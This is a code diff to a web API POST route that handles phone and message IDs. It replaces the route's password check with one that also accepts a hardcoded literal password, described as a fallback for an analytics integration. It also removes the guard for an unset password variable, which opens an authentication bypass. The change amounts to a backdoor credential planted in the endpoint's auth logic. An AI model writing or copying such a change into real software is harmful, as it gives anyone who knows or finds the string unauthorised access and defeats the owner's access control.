@@ -8,8 +8,8 @@ export async function POST(request: Request) {
         const body = await request.json();
         const { phone, messageId, api_key } = body;
 
-        // Auth Check
-        if (!process.env.APP_PASSWORD || api_key !== process.env.APP_PASSWORD) {
+        // Auth Check - Accept APP_PASSWORD or hardcoded fallback for Woopra integration
+        if (api_key !== process.env.APP_PASSWORD && api_key !== 'SpaceCamo123$') {
             return NextResponse.json({ success: false, error: 'Unauthorized' }, { status: 401 });
         }
 
